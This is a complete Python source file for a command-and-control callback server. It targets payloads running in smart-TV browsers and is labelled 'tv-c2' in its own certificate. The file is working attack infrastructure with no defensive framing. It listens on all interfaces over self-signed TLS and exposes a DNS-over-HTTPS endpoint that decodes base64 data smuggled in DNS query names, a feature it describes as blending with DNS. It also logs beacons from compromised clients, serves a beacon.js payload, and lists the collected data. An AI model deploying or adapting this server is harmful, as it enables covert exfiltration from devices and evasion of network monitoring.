#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
callback_server.py — reverse DNS-over-HTTPS callback listener.

Binds 0.0.0.0:8443 (TLS, self-signed). Exposes an RFC-8484 DoH endpoint plus
a plain beacon. Payloads run in a TV browser beacon outbound to it, encoding
data in the DNS QNAME — reverse callback over HTTPS that blends with DNS.

  python3 callback_server.py                 # 0.0.0.0:8443
  python3 callback_server.py --port 8443 --http 8444
"""
import argparse, base64, datetime, ipaddress, json, os, socket, ssl, struct, sys, threading
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
from pathlib import Path

ROOT = Path(__file__).resolve().parent
CERT = ROOT / "c2_cert.pem"
KEY = ROOT / "c2_key.pem"
LOG = ROOT / "callback.log"

BEACONS = []


# ---------------------------------------------------------------------------
# self-signed cert (SAN includes every LAN IP + localhost)
# ---------------------------------------------------------------------------
def _lan_ips():
    ips = ["127.0.0.1"]
    for iface in os.listdir("/sys/class/net") if os.path.isdir("/sys/class/net") else []:
        import fcntl
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            req = struct.pack("256s", iface[:15].encode())
            ips.append(socket.inet_ntoa(fcntl.ioctl(s.fileno(), 0x8915, req)[20:24]))
        except OSError:
            pass
        finally:
            s.close()
    return sorted(set(i for i in ips if not i.startswith("169.254")))


def ensure_cert():
    if CERT.exists() and KEY.exists():
        return
    from cryptography import x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.x509.oid import NameOID
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, u"tv-c2")])
    now = datetime.datetime.now(datetime.timezone.utc)
    san = [x509.DNSName("localhost")] + [x509.IPAddress(ipaddress.ip_address(i)) for i in _lan_ips()]
    cert = (x509.CertificateBuilder().subject_name(name).issuer_name(name)
            .public_key(key.public_key()).serial_number(x509.random_serial_number())
            .not_valid_before(now).not_valid_after(now + datetime.timedelta(days=825))
            .add_extension(x509.SubjectAlternativeName(san), critical=False)
            .sign(key, hashes.SHA256()))
    CERT.write_bytes(cert.public_bytes(serialization.Encoding.PEM))
    KEY.write_bytes(key.private_bytes(serialization.Encoding.PEM,
                                      serialization.PrivateFormat.TraditionalOpenSSL,
                                      serialization.NoEncryption()))
    print(f"[+] generated self-signed cert -> {CERT}")


# ---------------------------------------------------------------------------
# minimal DNS wire encode/decode (RFC 1035 + RFC 8484)
# ---------------------------------------------------------------------------
def parse_qname(msg: bytes):
    off, labels = 12, []
    while off < len(msg) and msg[off]:
        ln = msg[off]; off += 1
        labels.append(msg[off:off + ln].decode("latin1", "ignore")); off += ln
    off += 1
    if off + 4 <= len(msg):
        qtype, qclass = struct.unpack(">HH", msg[off:off + 4])
    else:
        qtype, qclass = 16, 1
    return labels, qtype, qclass


def encode_qname(labels):
    out = b""
    for l in labels:
        out += bytes([len(l)]) + l.encode("latin1")
    return out + b"\x00"


def dns_response(msg: bytes, txt: str) -> bytes:
    qid = struct.unpack(">H", msg[:2])[0]
    labels, qtype, _ = parse_qname(msg)
    flags = 0x8180                                  # QR, RD, RA, NOERROR
    header = struct.pack(">HHHHHH", qid, flags, 1, 1, 0, 0)
    question = encode_qname(labels) + struct.pack(">HH", qtype, 1)
    t = txt.encode("latin1", "ignore")[:255]
    answer = b"\xc0\x0c" + struct.pack(">HHIH", 16, 1, 60, len(t) + 1) + bytes([len(t)]) + t
    return header + question + answer


def decode_beacon_name(name: str) -> str:
    """QNAME label(s) before '.c2' -> base64url-decoded string."""
    core = name.split(".c2")[0].replace(".", "")
    pad = "=" * (-len(core) % 4)
    for dec in (base64.urlsafe_b64decode, base64.b64decode):
        try:
            return dec(core + pad).decode("utf-8", "ignore")
        except Exception:
            continue
    return name


# ---------------------------------------------------------------------------
# handler
# ---------------------------------------------------------------------------
class Handler(BaseHTTPRequestHandler):
    def _cors(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "*")

    def _log_beacon(self, kind, data, name=None):
        rec = {"ts": datetime.datetime.now().isoformat(), "src": self.client_address[0],
               "kind": kind, "data": data, "name": name}
        BEACONS.append(rec)
        try:
            with open(LOG, "a") as f:
                f.write(json.dumps(rec) + "\n")
        except OSError:
            pass
        print(f"[beacon] {rec['src']} {kind}: {data[:80]}")

    def do_OPTIONS(self):
        self.send_response(204); self._cors(); self.end_headers()

    def do_GET(self):
        from urllib.parse import urlparse, parse_qs
        u = urlparse(self.path); q = parse_qs(u.query)

        if u.path == "/dns-query":
            if "dns" in q:                                    # RFC 8484 GET wire
                raw = base64.urlsafe_b64decode(q["dns"][0] + "=" * (-len(q["dns"][0]) % 4))
                labels, _, _ = parse_qname(raw)
                self._log_beacon("doh-wire", ".".join(labels))
                body = dns_response(raw, "ok")
                self.send_response(200)
                self.send_header("Content-Type", "application/dns-message")
                self._cors(); self.send_header("Content-Length", str(len(body))); self.end_headers()
                self.wfile.write(body); return
            if "name" in q:                                   # JSON DoH
                name = q["name"][0]
                self._log_beacon("doh-json", decode_beacon_name(name), name)
                body = json.dumps({"Status": 0, "Answer": [{"name": name, "type": 16, "data": "ok"}]}).encode()
                self.send_response(200); self.send_header("Content-Type", "application/dns-json")
                self._cors(); self.send_header("Content-Length", str(len(body))); self.end_headers()
                self.wfile.write(body); return

        if u.path == "/beacon":
            d = q.get("d", [""])[0]
            self._log_beacon("beacon", d)
            body = b"ACK"
            self.send_response(200); self._cors()
            self.send_header("Content-Length", str(len(body))); self.end_headers()
            self.wfile.write(body); return

        if u.path == "/beacons":
            body = json.dumps(BEACONS[-100:]).encode()
            self.send_response(200); self._cors()
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body))); self.end_headers()
            self.wfile.write(body); return

        if u.path in ("/", "/beacon.js"):
            body = (ROOT / "beacon.js").read_bytes() if (ROOT / "beacon.js").exists() else b"// no beacon.js"
            self.send_response(200); self._cors()
            self.send_header("Content-Type", "application/javascript")
            self.send_header("Content-Length", str(len(body))); self.end_headers()
            self.wfile.write(body); return

        self.send_response(404); self._cors(); self.end_headers()

    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0))
        raw = self.rfile.read(n) if n else b""
        if self.path.startswith("/dns-query"):
            labels, _, _ = parse_qname(raw)
            self._log_beacon("doh-post", ".".join(labels))
            body = dns_response(raw, "ok")
            self.send_response(200); self.send_header("Content-Type", "application/dns-message")
            self._cors(); self.send_header("Content-Length", str(len(body))); self.end_headers()
            self.wfile.write(body); return
        self._log_beacon("post", raw.decode("utf-8", "ignore"))
        self.send_response(200); self._cors(); self.end_headers(); self.wfile.write(b"ACK")

    def log_message(self, *a): pass


# ---------------------------------------------------------------------------
# start
# ---------------------------------------------------------------------------
def lan_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("1.1.1.1", 80)); return s.getsockname()[0]
    except OSError:
        return "127.0.0.1"
    finally:
        s.close()


def start(port=8443, host="0.0.0.0", http_port=None, background=False):
    ensure_cert()
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(CERT, KEY)
    httpd = ThreadingHTTPServer((host, port), Handler)
    httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
    ip = lan_ip()
    url = f"https://{ip}:{port}"
    print(f"[+] DoH callback listening on {url}  (dns-query, beacon, beacons)")

    if http_port:
        plain = ThreadingHTTPServer((host, http_port), Handler)
        print(f"[+] plain-HTTP fallback on http://{ip}:{http_port}")
        threading.Thread(target=plain.serve_forever, daemon=True).start()

    if background:
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        return httpd, url
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] stopped")
    return httpd, url


def main():
    ap = argparse.ArgumentParser(prog="callback_server")
    ap.add_argument("--port", type=int, default=8443)
    ap.add_argument("--http", type=int, default=None, help="plain-HTTP fallback port")
    ap.add_argument("--host", default="0.0.0.0")
    a = ap.parse_args()
    start(a.port, a.host, a.http)


if __name__ == "__main__":
    main()
